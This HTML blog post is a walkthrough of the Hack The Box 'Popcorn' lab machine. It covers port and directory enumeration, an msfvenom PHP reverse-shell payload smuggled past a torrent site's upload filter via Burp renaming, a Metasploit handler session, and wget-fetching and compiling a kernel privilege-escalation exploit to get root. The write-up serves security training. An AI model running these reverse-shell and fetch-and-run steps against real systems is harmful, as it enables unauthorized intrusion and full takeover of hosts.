<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Popcorn - DiegoExploit
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    

<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-P385GSF');</script>
<!-- End Google Tag Manager -->
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>DiegoExploit</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>

</ul>
<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
</ul>


</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <br>
  <h1 id="Hack-The-Box-Popcorn"><a href="#Hack-The-Box-Popcorn" class="headerlink" title="Hack The Box popcorn"></a>Hack The Box Popcorn</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Popcorn was released on 15 Mar 2017, It is a medium  rated linux box, to consolidate those skills on beginner boxes. Its IP address is <code>10.10.10.6.</code> Letâ€™s go to hack!!!<br><img src="/images/hackthebox/exploit/popcorn/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services:</p>

<pre><figure class="highlight plain"><span class="line">
|-------(root@kali)-------|(~/HackTheBox/popcorn)<br>|<br>|-->{SFire129}#nmap -A -v 10.10.10.6
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-10 13:40 EDT
 NSE: Loaded 151 scripts for scanning.
 .
 .
 Completed Traceroute at 13:40, 0.18s elapsed
 Initiating Parallel DNS resolution of 2 hosts. at 13:40
 Completed Parallel DNS resolution of 2 hosts. at 13:40, 0.12s elapsed
 NSE: Script scanning 10.10.10.6.
 Initiating NSE at 13:40
 Completed NSE at 13:40, 5.38s elapsed
 Initiating NSE at 13:40
 Completed NSE at 13:40, 0.69s elapsed
 Initiating NSE at 13:40
 Completed NSE at 13:40, 0.00s elapsed
 Nmap scan report for 10.10.10.6
 Host is up (0.17s latency).
 Not shown: 998 closed ports
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
 |   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
 |_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
 80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
 | http-methods:
 |_  Supported Methods: GET HEAD POST OPTIONS
 |_http-server-header: Apache/2.2.12 (Ubuntu)
 |_http-title: Site doesn't have a title (text/html).
 No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
 TCP/IP fingerprint:
 OS:SCAN(V=7.80%E=4%D=5/10%OT=22%CT=1%CU=36668%PV=Y%DS=2%DC=T%G=Y%TM=5EB83C9
 OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=CB%GCD=1%ISR=CE%TI=Z%CI=Z%II=I%TS=8)OPS(O
 OS:1=M54DST11NW6%O2=M54DST11NW6%O3=M54DNNT11NW6%O4=M54DST11NW6%O5=M54DST11N
 OS:W6%O6=M54DST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(R
 OS:=Y%DF=Y%T=40%W=16D0%O=M54DNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
 OS:RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M54DST11NW6%RD=0%
 OS:Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%
 OS:A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%
 OS:DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIP
 OS:L=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
 
 Uptime guess: 0.719 days (since Sat May  9 20:25:46 2020)
 Network Distance: 2 hops
 TCP Sequence Prediction: Difficulty=203 (Good luck!)
 IP ID Sequence Generation: All zeros
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 TRACEROUTE (using port 1720/tcp)
 HOP RTT       ADDRESS
 1   168.54 ms 10.10.14.1
 2   168.93 ms 10.10.10.6
 
 NSE: Script Post-scanning.
 Initiating NSE at 13:40
 Completed NSE at 13:40, 0.00s elapsed
 Initiating NSE at 13:40
 Completed NSE at 13:40, 0.00s elapsed
 Initiating NSE at 13:40
 Completed NSE at 13:40, 0.00s elapsed
 Read data files from: /usr/bin/../share/nmap
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 33.46 seconds
            Raw packets sent: 1222 (57.554KB) | Rcvd: 1087 (47.082KB)
|-------(root@kali)-------|(~/HackTheBox/popcorn)<br>|<br>|-->{SFire129}#</figure></pre>


<p>Nmap reveals <code>Service http</code>on port 80,<code>OpenSSH</code> on port 22.
<br>
<p>Therefore we will to lauch a vulnerabily scan with nmap </p>

<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/popcorn)<br>|<br>|-->{SFire129}#nmap -sC -sV -p80,22 --script=*-vuln-* 10.10.10.6
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-09 19:12 EDT
 Nmap scan report for 10.10.10.6
 Host is up (0.11s latency).
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
 80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
 |_http-server-header: Apache/2.2.12 (Ubuntu)
 | http-vuln-cve2011-3192:
 |   VULNERABLE:
 |   Apache byterange filter DoS
 |     State: VULNERABLE
 |     IDs:  CVE:CVE-2011-3192  BID:49303
 |       The Apache web server is vulnerable to a denial of service attack when numerous
 |       overlapping byte ranges are requested.
 |     Disclosure date: 2011-08-19
 |     References:
 |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
 |       https://www.securityfocus.com/bid/49303
 |       https://www.tenable.com/plugins/nessus/55976
 |_      https://seclists.org/fulldisclosure/2011/Aug/175
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 11.36 seconds
|-------(root@kali)-------|(~/HackTheBox/popcorn)<br>|<br>|-->{SFire129}#</figure></pre>
<br>
<p>We can see vulnerabilities on apache with CVE-2011-3192.

<h2 id="Web-Server-Enumeration"><a href="#Web-Server-Enumeration" class="headerlink" title="Web Server Enumeration"></a>Web Server Enumeration</h2>
<p>We need to review the service on port 80 and enumerate possible directories.
<img src="/images/hackthebox/exploit/popcorn/1.png" alt="">
<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/popcorn)<br>|<br>|-->{SFire129}#gobuster dir -u http://10.10.10.6 -w /usr/share/wordlist/dirb/big.txt
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 [+] Url:            http://10.10.10.6
 [+] Threads:        10
 [+] Wordlist:       /usr/share/wordlists/dirb/big.txt
 [+] Status codes:   200,204,301,302,307,401,403
 [+] User Agent:     gobuster/3.0.1
 [+] Timeout:        10s
 ===============================================================
 2020/05/10 13:55:38 Starting gobuster
 ===============================================================
 /.htpasswd (Status: 403)
 /.htaccess (Status: 403)
 /.ssh (Status: 301)
 /cgi-bin/ (Status: 403)
 /index (Status: 200)
 /rename (Status: 301)
 /test (Status: 200)
 /torrent (Status: 301)
 ===============================================================
 2020/05/10 14:01:31 Finished
 ===============================================================
</figure></pre>
<br>
<p> After scan, we can see the directory called <code>torrent</code>, in this page we could be create an user in the Register section.
<pre><figure class="highlight plain">
<img src="/images/hackthebox/exploit/popcorn/3.png" alt=""
</figure></pre>
<br>
<p> After loggin in the section <code> Upload</code>, we see field for upload file, therefore, is not allowed to upload files with any extensions  different to .torrent.

<DIV ALIGN="justify"><img src="/images/hackthebox/exploit/popcorn/4.png" alt=""></DIV ALIGN="justify">

<br>
File uploaded
<DIV ALIGN="justify"><img src="/images/hackthebox/exploit/popcorn/5.png" alt=""></DIV ALIGN="justify">
</figure></pre>
<br>


<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2>
<p> Once in this point will need to create a reverse conection with reverse file with msfvenom like this:<br>
<code>msfvenom -p php/meterprete/reverse_tcp LHOST=10.10.14.23 LPORT=1010 -f raw > diegoexploit.php</code>
<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/popcorn)<br>|<br>|-->{SFire129}#msfvenom -p php/meterprete/reverse_tcp LHOST=10.10.14.23 LPORT=1010 -f raw > diegoexploit.php
 [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
 [-] No arch selected, selecting arch: php from the payload
 No encoder or badchars specified, outputting raw payload
 Payload size: 1112 bytes
</figure></pre>
<br
<p> As the web page not allow .php extension, we need to add .jpg extension to file.
<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/popcorn)<br> |<br> |-->{SFire129}#cp diegoexploit.php diegoexploit.php.jpg
  </figure></pre>
 <p> In the section edit:<br>
 1.) Push in screnshot botton for upload the file create.<br>
 2.) Run the <code>Burbsuite</code> for sniffing traffic.<br>
 3.) Locate the traffic with the name file.<br>
 4.) Change the name diegoexploit.php.jpg to diegoexploit.php
<br>
<pre><figure class="highlight plain">

<DIV ALIGN="justify"><img src="/images/hackthebox/exploit/popcorn/6.png" alt=""</DIV ALIGN="justify">
<img src="/images/hackthebox/exploit/popcorn/7.png" alt=""<br>
<DIV ALIGN="justify"><img src="/images/hackthebox/exploit/popcorn/8.png" alt=""</DIV ALIGN="justify">
</figure></pre>

 <p> 5.) If file was upload correctly, show us a message like this:
 <br>
 <DIV ALIGN="center"> <img src="/images/hackthebox/exploit/popcorn/9.png" alt=""> </DIV ALIGN="center">
 <p> 6.) In the secction <code>upload</code> on the web page, you could see a file with extension .php.
 <br>
 <DIV ALIGN="center"> <img src="/images/hackthebox/exploit/popcorn/10.png" alt=""> </DIV ALIGN="center">
 <br>
 <p> 7.) Now, from our terminal linux, we need to lanuch metasploit with <code>multi/handler/</code> and configuration payload.
 <br>
 <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/popcorn)<br>|<br>|-->{SFire129}#msfconsole
 msf5 > use exploit/multi/handler
 msf5 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
 payload => php/meterpreter/reverse_tcp
 msf5 exploit(multi/handler) > set LHOST 10.10.14.23
 LHOST => 10.10.14.23
 msf5 exploit(multi/handler) > set LPORT 1010
 LPORT => 1010
 msf5 exploit(multi/handler) > run  NOTE:whem you clic in the file .php extension on web page, will to init the meterpreter session.
[*] Started reverse TCP handler on 10.10.14.23:1010
[*] Sending stage (38288 bytes) to 10.10.10.6
[*] Meterpreter session 1 opened (10.10.14.23:1010 -> 10.10.10.6:40265) at 2020-05-09 20:43:16 -0400
meterpreter >
meterpreter > shell
Process 1421 created.
Channel 0 created.
whoami
www-data
SHELL=/bin/bash script -q /dev/null  --> With this command will to create a console linux
www-data@popcorn:/var/www/torrent/upload$cd /home/george/
www-data@popcorn:/home/george$ cat user.txt
***here will be show you the flag user***
www-data@popcorn:/home/george$</figure></pre>
 <br>
 <h2 id="Get-Privileges"><a href="#Get-Privileges" class="headerlink" title="Get Privileges"></a>Get Privileges</h2>
 <p> For to execute commands as a root, we need to get privileges, first review if the system kernel has script vulnerable for it.
  <pre><figure class="highlight plain"> www-data@popcorn:/home/george$ uname -a
 uname -a
 Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
 www-data@popcorn:/home/george$
 </figure></pre>
 <br>
 <p>With the command <code>searchsploit kernel 2.6.3 -w | grep Ubuntu</code> will show us, whole results relation with Ubuntu kernel, in this case I'll use 157704 exploit.
 <pre><figure class="highlight plain"> |-------(root@kali)-------|(/home/kali)<br>|<br>|-->{SFire129}#searchsploit kernel 2.6.3 -w | grep Ubuntu
 Linux Kernel 2.6.32 (Ubuntu 10.04) - '/proc' Handling SUID Privilege Escalation             | https://www.exploit-db.com/exploits/41770
 Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) - 'Full-Nelson.c' Local Privilege Escalation    | https://www.exploit-db.com/exploits/15704
 Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) - 'Mempodipper' Local Privilege Escal | https://www.exploit-db.com/exploits/18411
 Linux Kernel < 2.6.34 (Ubuntu 10.10 x86) - 'CAP_SYS_ADMIN' Local Privilege Escalation (1)   | https://www.exploit-db.com/exploits/15916
 Linux Kernel < 2.6.34 (Ubuntu 10.10 x86/x64) - 'CAP_SYS_ADMIN' Local Privilege Escalation ( | https://www.exploit-db.com/exploits/15944
 Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - 'CAN BCM' Local Privilege Escalation    | https://www.exploit-db.com/exploits/14814
 Linux Kernel < 2.6.36-rc6 (RedHat / Ubuntu 10.04) - 'pktcdvd' Kernel Memory Disclosure      | https://www.exploit-db.com/exploits/15150
 Linux Kernel < 2.6.36.2 (Ubuntu 10.04) - 'Half-Nelson.c' Econet Privilege Escalation        | https://www.exploit-db.com/exploits/17787
 ReiserFS (Linux Kernel 2.6.34-rc3 / RedHat / Ubuntu 9.10) - 'xattr' Local Privilege Escalat | https://www.exploit-db.com/exploits/12130
 |-------(root@kali)-------|(/home/kali)<br>|<br>|-->{SFire129}#
 </figure></pre>
 
 <p>Now, we need to create a file with the whole exploit inside it. In my case I will to create a file <code> nano 15704.c</code> with the all script found in  <a class="vglnk" href="https://www.exploit-db.com/exploits/15704"rel="nofollow"><span> Exploit 15704.c</span></a> </a>
<br>
<br>
 1.) Create/download the file 15704.c.<br>
 2.) start service http <code> python3 -m http.server 8081</code>
 
 <pre><figure class="highlight plain">|-------(root@kali)-------|(/home/kali)
 |
 |-->{SFire129}#python3 -m http.server 8081
 Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
  </figure></pre>
  <br>
  <p> From the shell create inside the server:
  <br>
  <br>
  1.) Create folder /tmp. <br>
  2.) Download de file 15704.c from kali linux. <br>
  3.) Add to execution privileges.<br>
  4.) Compile 15704.c file.<br>
  5.) Run file compiled.<br>
  
  <pre><figure class="highlight plain">
 www-data@popcorn:/tmp$ wget http://10.10.14.23:8081/15704.c
 wget http://10.10.14.23:8081/15704.c
 --2020-05-10 04:33:20--  http://10.10.14.23:8081/15704.c
 Connecting to 10.10.14.23:8081... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 9211 (9.0K) [text/plain]
 Saving to: `15704.c'

 100%[======================================>] 9,211       52.9K/s   in 0.2s

 2020-05-10 04:33:20 (52.9 KB/s) - `15704.c' saved [9211/9211]

 www-data@popcorn:/tmp$ chmod  +x 15704.c
 www-data@popcorn:/tmp$ gcc 15704.c -o echo.privesc
 www-data@popcorn:/tmp$ ./echo.privesc
 ./echo.privesc
 [*] Resolving kernel addresses...
 [+] Resolved econet_ioctl to 0xf8415280
 [+] Resolved econet_ops to 0xf8415360
 [+] Resolved commit_creds to 0xc01645d0
 [+] Resolved prepare_kernel_cred to 0xc01647d0
 [*] Calculating target...
 [*] Triggering payload...
 [*] Got root!
 # whoami
 root
 #  </figure></pre>
 <br>
  <h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="headerlink" title="Capture The Flag"></a>Capture The Flag</h2>
  <pre><figure class="highlight plain"># pwd
/tmp
# cd /root
cd /root
# ls
root.txt
# cat root.txt
cat root.txt
***here will be show you the flag root***
#</figure></pre>
 <br>
 
<p> And we owned root !</p>
</div>



  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.png" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>DiegoExploit</div>
      <div>2020-05-11</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/linux/" rel="tag">#linux</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#Exploit</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#capture-the-Flag</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
